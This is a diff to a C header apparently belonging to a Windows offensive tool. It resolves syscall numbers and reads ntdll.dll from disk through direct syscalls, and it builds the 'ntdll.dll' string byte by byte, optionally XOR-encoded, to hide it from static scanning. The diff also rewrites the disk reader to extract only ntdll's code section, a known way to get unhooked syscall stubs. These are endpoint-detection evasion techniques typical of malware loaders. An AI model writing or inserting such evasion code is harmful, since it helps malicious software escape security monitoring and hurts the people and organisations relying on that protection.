@@ -39,8 +39,24 @@ static NTSTATUS DirectSyscall(void) {
 }
 
 /* ================= SSN resolver ================= */
-static DWORD ResolveSSN(const char* functionName)
-{
+static DWORD ResolveSSN(const char* functionName) {
+	char stackbuf[10];
+
+    char* ntdll_dll = stackbuf;
+#ifdef XOR
+    ntdll_dll[0] = 'n'^XOR_KEY(9); ntdll_dll[1] = 't'^XOR_KEY(9);
+    ntdll_dll[2] = 'd'^XOR_KEY(9); ntdll_dll[3] = 'l'^XOR_KEY(9);
+    ntdll_dll[4] = 'l'^XOR_KEY(9); ntdll_dll[5] = '.'^XOR_KEY(9);
+    ntdll_dll[6] = 'd'^XOR_KEY(9); ntdll_dll[7] = 'l'^XOR_KEY(9);
+    ntdll_dll[8] = 'l'^XOR_KEY(9); ntdll_dll[9] = 0;
+    xor_decode(ntdll_dll);
+#else
+    ntdll_dll[0] = 'n'; ntdll_dll[1] = 't'; ntdll_dll[2] = 'd';
+    ntdll_dll[3] = 'l'; ntdll_dll[4] = 'l'; ntdll_dll[5] = '.';
+    ntdll_dll[6] = 'd'; ntdll_dll[7] = 'l'; ntdll_dll[8] = 'l';
+    ntdll_dll[9] = 0;
+#endif
+
     HMODULE hNtdll = myGetModuleHandleA(ntdll_dll);
     BYTE* funcBytes = (BYTE*)myGetProcAddress(hNtdll, functionName);
 
@@ -67,7 +83,7 @@ static DWORD ResolveSSN(const char* functionName)
 }
 
 /* ================= Disk bootstrap via ntdll ================= */
-static void ReadNtdllFromDisk(BYTE** ImageBase, DWORD* ImageSize) {
+static void ReadNtdllTextSection(BYTE** ImageBase, DWORD* ImageSize) {
     SYSCALL_PREPARE(ntcreatefile);
     NtCreateFile_t pNtCreateFile = SYSCALL_CALL(NtCreateFile_t);
 
@@ -88,7 +104,7 @@ static void ReadNtdllFromDisk(BYTE** ImageBase, DWORD* ImageSize) {
 
     HANDLE hFile = NULL;
     IO_STATUS_BLOCK iosb;
-    NTSTATUS st = 0;
+    FILE_STANDARD_INFORMATION fsi;
 
     UNICODE_STRING us;
     us.Buffer = path;
@@ -98,27 +114,52 @@ static void ReadNtdllFromDisk(BYTE** ImageBase, DWORD* ImageSize) {
     OBJECT_ATTRIBUTES oa;
     InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    FILE_STANDARD_INFORMATION fsi;
-    SIZE_T size = 0;
-    PVOID buffer = NULL;
-
-    st = pNtCreateFile(&hFile, GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
+    pNtCreateFile(&hFile, GENERIC_READ, &oa, &iosb, NULL,
+                  FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
+                  FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
 
     pNtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
 
-    size = (SIZE_T)fsi.EndOfFile.QuadPart;
+    SIZE_T fileSize = (SIZE_T)fsi.EndOfFile.QuadPart;
+    PVOID fileBuffer = NULL;
 
-    pNtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    pNtAllocateVirtualMemory((HANDLE)-1, &fileBuffer, 0, &fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    st = pNtReadFile(hFile, NULL, NULL, NULL, &iosb, buffer, (ULONG)size, NULL, NULL);
-
+    pNtReadFile(hFile, NULL, NULL, NULL, &iosb, fileBuffer, (ULONG)fileSize, NULL, NULL);
     pNtClose(hFile);
 
-    *ImageBase = (BYTE*)buffer;
-    *ImageSize = (DWORD)iosb.Information;
+    BYTE* base = (BYTE*)fileBuffer;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
+    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
+
+    PVOID textSection = NULL;
+    SIZE_T textSize = 0;
+
+    int i = 0;
+    while (i < (int)nt->FileHeader.NumberOfSections) {
+        if (sec->Characteristics & IMAGE_SCN_CNT_CODE) {
+            textSize = sec->SizeOfRawData;
+            pNtAllocateVirtualMemory((HANDLE)-1, &textSection, 0, &textSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+            BYTE* src = base + sec->PointerToRawData;
+            BYTE* dst = (BYTE*)textSection;
+            SIZE_T k = 0;
+            while (k < textSize) {
+                dst[k] = src[k];
+                k++;
+            }
+            break;
+        }
+        sec++;
+        i++;
+    }
 
     SIZE_T zero = 0;
-    pNtFreeVirtualMemory((HANDLE)-1, &buffer, &zero, MEM_RELEASE);
+    pNtFreeVirtualMemory((HANDLE)-1, &fileBuffer, &zero, MEM_RELEASE);
+
+    *ImageBase = (BYTE*)textSection;
+    *ImageSize = (DWORD)textSize;
 }
 
 #endif // DIRECT_SYSCALL_H
